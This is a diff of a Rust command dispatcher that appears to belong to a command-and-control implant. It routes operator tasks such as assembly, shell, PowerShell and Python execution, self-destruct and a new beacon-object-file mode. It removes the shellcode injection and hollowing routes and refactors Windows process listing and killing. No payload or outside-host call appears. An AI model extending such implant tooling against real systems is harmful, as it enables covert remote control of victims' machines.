@@ -243,8 +243,8 @@ impl BatchMessageHandler {
         // Route command execution
         match command_payload.command_type.as_str() {
             // Plugin execution types - route to batch manager (non-blocking)
-            "execute_assembly" | "inject_shellcode" | "hollow_shellcode" | "run_memfd_elf" | 
-            "shell_script" | "powershell_script" | "python_script" | "self_destruct" => {
+            "execute_assembly" | "shell_script" | "powershell_script" | "python_script"
+            | "self_destruct" | "bof_exec" => {
                 self.handle_plugin_command_async(command_payload).await?;
             }
             
@@ -285,14 +285,17 @@ impl BatchMessageHandler {
         // Map command types to plugin execution types
         let execution_type = match command_payload.command_type.as_str() {
             "execute_assembly" => "execute-assembly",
-            "inject_shellcode" => "inject-shellcode", 
-            "hollow_shellcode" => "hollow-shellcode",
-            "run_memfd_elf" => "memfd-exec",
             "shell_script" => "shell-script",
             "powershell_script" => "powershell-script",
             "python_script" => "python-script",
             "self_destruct" => "self-destruct",
-            _ => return Err(ClientError::ConnectionError(format!("Unknown plugin type: {}", command_payload.command_type))),
+            "bof_exec" => "bof-exec",
+            _ => {
+                return Err(ClientError::ConnectionError(format!(
+                    "Unknown or removed plugin type: {} (process injection is not supported)",
+                    command_payload.command_type
+                )))
+            }
         };
         
         // Parse plugin task
@@ -445,45 +448,39 @@ impl BatchMessageHandler {
             "process_list" => {
                 #[cfg(target_os = "windows")]
                 {
-                    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS};
-                    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-                    use winapi::shared::minwindef::TRUE;
-
-                    let mut processes = Vec::new();
-                    unsafe {
-                        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-                        if snapshot != INVALID_HANDLE_VALUE {
-                            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
-                            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
-
-                            if Process32FirstW(snapshot, &mut entry) == TRUE {
-                                loop {
-                                    let name = String::from_utf16_lossy(&entry.szExeFile).trim_matches('\0').to_string();
-                                    processes.push(serde_json::json!({
-                                        "pid": entry.th32ProcessID,
-                                        "ppid": entry.th32ParentProcessID,
-                                        "name": name,
+                    match crate::native::list_processes() {
+                        Ok(list) => {
+                            let processes: Vec<serde_json::Value> = list
+                                .into_iter()
+                                .map(|p| {
+                                    serde_json::json!({
+                                        "pid": p.pid,
+                                        "ppid": p.ppid,
+                                        "name": p.name,
                                         "user": "",
                                         "path": "",
                                         "arch": "x64",
-                                    }));
-                                    if Process32NextW(snapshot, &mut entry) != TRUE { break; }
-                                }
+                                    })
+                                })
+                                .collect();
+                            CommandResult {
+                                stdout: serde_json::to_string(&processes).unwrap_or_else(|_| "[]".to_string()),
+                                stderr: String::new(),
+                                path: None,
+                                req_id: None,
                             }
-                            CloseHandle(snapshot);
                         }
-                    }
-                    CommandResult {
-                        stdout: serde_json::to_string(&processes).unwrap_or_else(|_| "[]".to_string()),
-                        stderr: String::new(),
-                        path: None,
-                        req_id: None,
+                        Err(e) => CommandResult {
+                            stdout: "[]".to_string(),
+                            stderr: e,
+                            path: None,
+                            req_id: None,
+                        },
                     }
                 }
-                
+
                 #[cfg(not(target_os = "windows"))]
                 {
-                    // Minimal fallback for non-windows
                     CommandResult {
                         stdout: "[]".to_string(),
                         stderr: "Process listing not implemented for this platform in batch handler".to_string(),
@@ -497,24 +494,19 @@ impl BatchMessageHandler {
                 if let Ok(pid_u32) = pid_str.parse::<u32>() {
                     #[cfg(target_os = "windows")]
                     {
-                        use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
-                        use winapi::um::winnt::PROCESS_TERMINATE;
-                        use winapi::um::handleapi::CloseHandle;
-                        use winapi::shared::minwindef::FALSE;
-
-                        unsafe {
-                            let h = OpenProcess(PROCESS_TERMINATE, FALSE, pid_u32);
-                            if !h.is_null() {
-                                let res = TerminateProcess(h, 1);
-                                CloseHandle(h);
-                                if res != FALSE {
-                                    CommandResult { stdout: format!("Process {} terminated", pid_str), stderr: String::new(), path: None, req_id: None }
-                                } else {
-                                    CommandResult { stdout: String::new(), stderr: "Failed to kill process".to_string(), path: None, req_id: None }
-                                }
-                            } else {
-                                CommandResult { stdout: String::new(), stderr: "Process not found or access denied".to_string(), path: None, req_id: None }
-                            }
+                        match crate::native::terminate_process(pid_u32) {
+                            Ok(()) => CommandResult {
+                                stdout: format!("Process {} terminated", pid_str),
+                                stderr: String::new(),
+                                path: None,
+                                req_id: None,
+                            },
+                            Err(e) => CommandResult {
+                                stdout: String::new(),
+                                stderr: e,
+                                path: None,
+                                req_id: None,
+                            },
                         }
                     }
                     #[cfg(not(target_os = "windows"))]
